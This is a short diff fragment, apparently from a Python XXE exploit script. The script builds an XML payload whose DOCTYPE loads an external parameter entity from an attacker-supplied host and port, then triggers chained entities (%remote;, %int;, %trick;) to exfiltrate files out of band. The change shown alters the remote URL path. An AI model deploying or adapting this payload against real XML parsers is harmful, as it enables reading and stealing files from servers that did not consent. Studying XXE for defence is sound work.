@@ -24,7 +24,7 @@ HOST =line.split("<")[6].split().pop()
 #Creating Xml file
 xml="""<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE root [
-<!ENTITY % remote SYSTEM "http://{}:{}/xml?f=FULLPATH">
+<!ENTITY % remote SYSTEM "http://{}:{}/xml">
 %remote;
 %int;
 %trick;]>
